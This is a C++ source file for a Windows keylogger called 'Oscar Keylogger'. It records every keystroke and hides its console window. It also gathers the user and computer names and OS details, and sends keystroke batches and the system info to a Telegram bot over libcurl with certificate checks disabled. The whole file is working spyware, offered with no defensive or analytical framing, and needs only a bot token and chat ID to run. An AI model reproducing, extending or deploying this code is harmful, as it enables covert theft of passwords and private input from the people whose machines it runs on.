#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>
#include <windows.h>
#include <conio.h>
#include <ctime>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>

#ifdef _WIN32
#include <lmcons.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#endif

class Keylogger {
    private:
        std::string bot_token;
        std::string chat_id;
        std::string log_file_path;
        bool is_running;
        int key_count;
        const int MAX_KEYS_BEFORE_SEND = 50;
    public:
        Keylogger(const std::string& token, const std::string& chat_id) 
            : bot_token(token), chat_id(chat_id), is_running(false), key_count(0) {
            log_file_path = "logs/log_" + get_current_time() + ".log";
            create_log_directory();
        }

        ~Keylogger() {
            stop();
        }

        void create_log_directory() {
            CreateDirectory("logs", NULL);
        }

        std::string get_current_time() {
            time_t now = time(0);
            tm* t = localtime(&now);
            std::stringstream ss;
            ss << std::put_time(t, "%Y-%m-%d_%H-%M-%S");
            return ss.str();
        }

        std::string get_timestamp() {
            time_t now = time(0);
            tm* t = localtime(&now);
            std::stringstream ss;
            ss << "[" << std::put_time(t, "%Y-%m-%d %H:%M:%S") << "] ";
            return ss.str();
        }

        bool send_to_telegram(const std::string& message) {
            CURL* curl = curl_easy_init();
            if (!curl) return false;

            char* escaped = curl_easy_escape(curl, message.c_str(), message.length());
            if (!escaped) {
                curl_easy_cleanup(curl);
                return false;
            }

            std::string url = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + chat_id + "&text=" + std::string(escaped);
            curl_free(escaped);

            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

            CURLcode res = curl_easy_perform(curl);
            
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);

            if (res != CURLE_OK) {
                std::cerr << "Telegram send failed: " << curl_easy_strerror(res) << std::endl;
                return false;
            }
            return true;
        }

        std::string key_to_string(int key_code, bool is_shift_pressed = false) {
            switch (key_code) {
                case VK_SPACE: return " ";
                case VK_RETURN: return "\n[ENTER]\n";
                case VK_BACK: return "[BACKSPACE]";
                case VK_TAB: return "[TAB]";
                case VK_ESCAPE: return "[ESC]";
                case VK_SHIFT: return "[SHIFT]";
                case VK_CONTROL: return "[CTRL]";
                case VK_MENU: return "[ALT]";
                case VK_CAPITAL: return "[CAPS]";
                case VK_UP: return "[UP]";
                case VK_DOWN: return "[DOWN]";
                case VK_LEFT: return "[LEFT]";
                case VK_RIGHT: return "[RIGHT]";
                case VK_DELETE: return "[DELETE]";
                case VK_HOME: return "[HOME]";
                case VK_END: return "[END]";
                case VK_PRIOR: return "[PAGE_UP]";
                case VK_NEXT: return "[PAGE_DOWN]";
                case VK_INSERT: return "[INSERT]";
                case VK_PRINT: return "[PRINT_SCREEN]";
                case VK_SNAPSHOT: return "[PRINT_SCREEN]";
                case VK_SCROLL: return "[SCROLL_LOCK]";
                case VK_PAUSE: return "[PAUSE]";
                case VK_NUMLOCK: return "[NUM_LOCK]";
                
                default:
                    if (key_code >= 0x30 && key_code <= 0x39) { // 0-9
                        if (is_shift_pressed) {
                            static const char* shift_numbers = ")!@#$%^&*(";
                            return std::string(1, shift_numbers[key_code - 0x30]);
                        }
                        return std::string(1, (char)key_code);
                    }
                    if (key_code >= 0x41 && key_code <= 0x5A) { // A-Z
                        char c = (char)key_code;
                        if (!is_shift_pressed && !(GetKeyState(VK_CAPITAL) & 0x0001)) {
                            c = tolower(c);
                        }
                        return std::string(1, c);
                    }
                    if (key_code >= 0x60 && key_code <= 0x69) { // NumPad 0-9
                        return std::string(1, (char)(key_code - 0x60 + '0'));
                    }
                    
                    if (key_code >= 0xBA && key_code <= 0xBF) {
                        static const std::map<int, std::pair<char, char>> special_keys = {
                            {0xBA, {';', ':'}}, {0xBB, {'=', '+'}}, 
                            {0xBC, {',', '<'}}, {0xBD, {'-', '_'}},
                            {0xBE, {'.', '>'}}, {0xBF, {'/', '?'}}
                        };
                        auto it = special_keys.find(key_code);
                        if (it != special_keys.end()) {
                            return std::string(1, is_shift_pressed ? it->second.second : it->second.first);
                        }
                    }
                    
                    return "[" + std::to_string(key_code) + "]";
            }
        }

        bool is_shift_pressed() {
            return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        }

        void start_logging() {
            is_running = true;
            std::ofstream log_file(log_file_path, std::ios::app);
            std::string buffer;
            
            send_to_telegram("✅ Keylogger Started!\n" + get_system_info());

            while (is_running) {
                for (int key = 8; key <= 255; key++) {
                    if (GetAsyncKeyState(key) & 0x8000) {
                        bool shift = is_shift_pressed();
                        std::string key_str = key_to_string(key, shift);
                        
                        log_file << key_str;
                        log_file.flush();
                        
                        buffer += key_str;
                        key_count++;
                        
                        if (key_count >= MAX_KEYS_BEFORE_SEND || key == VK_RETURN) {
                            if (!buffer.empty()) {
                                std::string log_entry = get_timestamp() + buffer;
                                send_to_telegram(log_entry);
                                buffer.clear();
                                key_count = 0;
                            }
                        }
                        
                        while (GetAsyncKeyState(key) & 0x8000) {
                            std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        }
                    }
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            log_file.close();
        }

        std::string get_system_info() {
            std::stringstream info;
            info << "🖥️ System Information:\n";
            
            #ifdef _WIN32
                char username[UNLEN + 1];
                DWORD username_len = UNLEN + 1;
                if (GetUserName(username, &username_len)) {
                    info << "👤 User: " << username << "\n";
                }
                
                char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD comp_size = MAX_COMPUTERNAME_LENGTH + 1;
                if (GetComputerName(computer_name, &comp_size)) {
                    info << "💻 Computer: " << computer_name << "\n";
                }
                
                OSVERSIONINFO osvi;
                ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
                osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
                if (GetVersionEx(&osvi)) {
                    info << "🪟 OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
                    info << " (Build " << osvi.dwBuildNumber << ")\n";
                }
                
                SYSTEM_INFO sysInfo;
                GetSystemInfo(&sysInfo);
                info << "🖥️ Processor: " << sysInfo.dwNumberOfProcessors << " cores\n";
                
            #else
                struct passwd* pw = getpwuid(getuid());
                info << "👤 User: " << (pw ? pw->pw_name : "unknown") << "\n";
                
                struct utsname buffer;
                if (uname(&buffer) == 0) {
                    info << "🐧 OS: " << buffer.sysname << " " << buffer.release;
                    info << " (" << buffer.machine << ")\n";
                }
            #endif
            
            // TODO: I'll remember to expand this section later when I add settings.
            // info << "🌐 IP: " << get_public_ip() << "\n";
            
            return info.str();
        }

        void stop() {
            is_running = false;
            send_to_telegram("⏹️ Keylogger Stopped");
        }

        void run_hidden() {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            start_logging();
        }
};

int main(int argc, char* argv[]) {
    std::string token = "YOUR_TELEGRAM_BOT_TOKEN";
    std::string chat_id = "YOUR_CHAT_ID";
    
    if (argc >= 3) {
        token = argv[1];
        chat_id = argv[2];
    }
    
    if (token == "YOUR_TELEGRAM_BOT_TOKEN" || chat_id == "YOUR_CHAT_ID") {
        std::cerr << "❌ Error: Please set your Telegram Bot Token and Chat ID" << std::endl;
        std::cerr << "Usage: " << argv[0] << " <BOT_TOKEN> <CHAT_ID>" << std::endl;
        std::cerr << "Or edit the source code and set default values." << std::endl;
        return 1;
    }
    
    std::cout << "🔐 Oscar Keylogger Starting..." << std::endl;
    
    Keylogger logger(token, chat_id);
    logger.run_hidden();
    
    return 0;
}